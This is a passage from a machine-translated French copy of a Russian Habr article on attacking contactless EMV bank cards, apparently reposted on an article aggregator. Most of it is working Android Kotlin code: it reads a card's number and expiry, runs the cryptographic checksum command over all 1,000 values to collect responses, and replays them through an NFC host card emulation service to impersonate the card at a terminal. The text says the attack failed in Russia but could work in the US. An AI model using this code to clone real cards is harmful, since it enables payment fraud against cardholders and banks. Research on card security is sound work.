fun readCardMagStripe() { try { var response = execute(Commands.SELECT_PPSE) //       val select = Commands.SELECT_APPLICATION.apply { Nc = response.toHex().substring(52, 68) SW1WS2 = "00" } val cardtype: String = getTypeCard(select.split()) execute(select) execute(Commands.GET_PROCESSING_OPTIONS) response = execute(Commands.READ_RECORD_1.apply { P2 = "0C" Lc = "00" Le = "" Nc = "" }) if (cardtype === "MasterCard") { cardnumber = "Card number: ${response.getCards()}" cardexpiration = "Card expiration: ${response.getExpired()}" showData() for (i in 0..999) { execute(Commands.GET_PROCESSING_OPTIONS, false) execute(Commands.COMPUTE_CRYPTOGRAPHIC_CHECKSUM.apply { Lc = "04" Nc = "00000${String.format("%03d", i)}".replace("..(?!$)".toRegex(), "$0 ") }) } } finishRead() }</code> </pre><br>  Un ensemble de commandes dont nous avons besoin. <br><br><pre> <code class="plaintext hljs">object Commands { val SELECT_PPSE = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Lc = "0E", Nc = "32 50 41 59 2E 53 59 53 2E 44 44 46 30 31 00") val SELECT_APPLICATION = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Nc = "07") val GET_PROCESSING_OPTIONS = Command(CLA = "80", INS = "A8", P1 = "00", P2 = "00", Lc = "02", Nc = "83 00", Le = "00") val READ_RECORD_1 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "14", Lc = "00", Le = "00") val READ_RECORD_2 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "1C", Lc = "00", Le = "00") val READ_RECORD_3 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "24", Lc = "00", Le = "00") val READ_RECORD_4 = Command(CLA = "00", INS = "B2", P1 = "02", P2 = "24", Lc = "00", Le = "00") val COMPUTE_CRYPTOGRAPHIC_CHECKSUM = Command(CLA = "80", INS = "2A", P1 = "8E", P2 = "80", Le = "00") }</code> </pre><br>  Pour impl√©menter l'√©coute √©lectronique des commandes √† partir du terminal, vous devez d√©marrer votre service et le d√©clarer dans le manifeste.  Dans ce service, une commande du terminal vient √† processCommandApdu, nous la comparons avec celle qui est stock√©e dans le fichier, et donnons la r√©ponse, qui est √©crite dans la ligne suivante. <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".NfcService"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:exported</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BIND_NFC_SERVICE"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.action.HOST_APDU_SERVICE"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">category</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.category.DEFAULT"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta-data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.host_apdu_service"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:resource</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@xml/apdu_config"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><pre> <code class="plaintext hljs">class NfcService : HostApduService() { fun getData(context: Context?): List&lt;Command&gt; { var list: List&lt;Command&gt; = arrayListOf() filePath?.let { if (it.isNotBlank()) { list = getCommands(Uri.fromFile(File(it)).readTextFromUri(context), this::showError) } else { Toast.makeText(applicationContext, "Not found file path", Toast.LENGTH_SHORT).show() } } return list } private var commands: List&lt;Command&gt;? = arrayListOf() override fun processCommandApdu(apdu: ByteArray?, bundle: Bundle?): ByteArray { commands = getData(applicationContext) commands?.forEachIndexed { i, command -&gt; if (apdu.toHex() == command.getHexString()) { return commands!![i+1].split() } } Log.e("LOG", "Finnish") return Value.magStripModeEmulated.hexToByteArray() }</code> </pre> <br>  Quelques captures d'√©cran de l'application.  Nous lisons la carte et le journal de parcimonie: <br><br><img src="https://habrastorage.org/webt/0p/qt/vj/0pqtvjicqlg6hh4iorgruoljd_w.png"><br><br>  Ainsi, il est possible de simuler le fonctionnement d'une carte EMV sans contact sur un t√©l√©phone avec des donn√©es de carte.  Mais heureusement ou malheureusement pour quelqu'un, cette attaque ne fonctionne pas en Russie.  Selon nos exp√©riences, la transaction a tout le temps atteint la banque de l'√©metteur et a √©t√© rejet√©e par la banque elle-m√™me.  De plus, nous n'avons pas pu effectuer de transaction hors ligne √† l'aide de MagStripe.  Cependant, une telle attaque pourrait bien √™tre mise en ≈ìuvre dans d'autres pays o√π l'utilisation du mode MagStripe est assez courante et l'algorithme de gestion des risques est l√©g√®rement diff√©rent, par exemple, aux √âtats-Unis. <br><br><h4>  Liens avec l'aide de cet article </h4><br>  Cartes √† microprocesseur bancaires / I.M. Goldovsky - M .: TsIPSiR: Alpina Pub Lakers, 2010 .-- 686 p. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Projet EMV: √©tape par √©tape</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Recherche de chercheurs autrichiens</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Lien vers le code d'application</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Terminal Simulator.</a> <br><br>  Merci √† <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" class="user_link">barracud4</a> de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" class="user_link">m'avoir</a> aid√© √† pr√©parer cet article. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr421543/">https://habr.com/ru/post/fr421543/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr421529/index.html">Netflix, Uber, Google et vous au MBLT DEV 2018</a></li>
<li><a href="../fr421531/index.html">Comment int√©grer ReactJS dans 1C-Bitrix avec g√©n√©ration automatique de mod√®les sur le back-end en utilisant l'exemple du r√©seau Globus</a></li>
<li><a href="../fr421533/index.html">Choisir un langage de programmation: 3 conseils d'un programmeur d'Apple</a></li>
<li><a href="../fr421535/index.html">Aventure - Electronique. Sur une balan√ßoire ail√©e dans le monde informatique</a></li>
<li><a href="../fr421537/index.html">Fonctions d'ordre sup√©rieur dans JS: cours pour jeunes combattants</a></li>
<li><a href="../fr421545/index.html">Examen du PocketBook 616 - le portefeuille le plus √©conomique 2018 avec fonction de r√©tro-√©clairage</a></li>
<li><a href="../fr421547/index.html">Acceptation du centre de donn√©es ind√©pendant</a></li>
<li><a href="../fr421549/index.html">Nous r√©digeons de la documentation technique: un guide pour le profane</a></li>
<li><a href="../fr421551/index.html">Ma√Ætriser Vuex - De z√©ro √† h√©ros</a></li>
<li><a href="../fr421553/index.html">Nous partageons le contenu technologique: nous avons rassembl√© tous nos mat√©riaux sur un seul site</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>